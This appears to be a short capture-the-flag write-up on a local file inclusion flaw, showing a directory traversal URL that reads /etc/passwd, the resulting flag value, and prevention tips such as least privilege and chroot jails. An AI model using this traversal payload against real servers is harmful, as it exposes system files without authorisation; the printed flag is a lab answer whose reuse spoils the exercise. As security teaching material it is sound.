
[Local File Inclusion Vulnerability](https://youtu.be/AALacSN2SRw?list=PLqM63j87R5p77_vK-eL9eFbhz6BJ1Av7r)

u get message indications with each backtrack (../)

`http://IP/index.php?page=../../../../../../../` ==> pops "You can DO it !!!  :]"


`http://IP/index.php?page=../../../../../../../etc/passwd`

Congratulaton!! The flag is : `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`


## # Prevention

1. Hosting documents on a separate file-server or file partition, or in cloud storage, is a good idea too. This will allow you to prevent mixing public documents and more sensitive material.

2. It is a good practice to run your server processes with only the permissions that they require to function . This can help limit the impact of vulnerabilities as a second line of defense.
Make sure the server process can only access the directories it needs. Consider running the process in a - **chroot jail** - if you are running on Unix. This will mitigate the risks if a directory traversal vulnerability is discovered.